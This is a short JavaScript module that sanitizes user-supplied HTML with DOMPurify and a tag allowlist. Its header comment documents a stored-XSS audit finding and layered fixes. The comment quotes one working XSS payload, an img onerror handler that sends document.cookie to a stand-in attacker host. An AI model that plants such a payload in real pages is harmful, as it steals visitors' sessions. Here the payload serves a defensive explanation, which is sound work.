/**
 * Server-side output sanitization for any field that gets rendered as HTML.
 *
 * AUDIT NOTE (finding SEC-08, stored XSS): post bodies and comments were
 * saved raw and rendered on the frontend with dangerouslySetInnerHTML, so
 * a comment like <img src=x onerror=fetch('//evil.tld/steal?c='+document.cookie)>
 * executed for every visitor who viewed the post. This is defense-in-depth:
 * the REAL fix is layered —
 *   1. Sanitize on write (here) so stored data is already clean.
 *   2. Sanitize again on render (frontend/src/utils/sanitize.js) in case
 *      of any future storage that bypasses this layer.
 *   3. Strict CSP (config/security.js) as a last line of defense so even a
 *      missed payload can't execute or exfiltrate data.
 *   4. httpOnly cookies for auth tokens, so even successful script
 *      injection can't read the session (see middleware/auth.js).
 */

const DOMPurify = require('isomorphic-dompurify');

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'];

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS,
    ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
  });
}

module.exports = { sanitizeHtml };
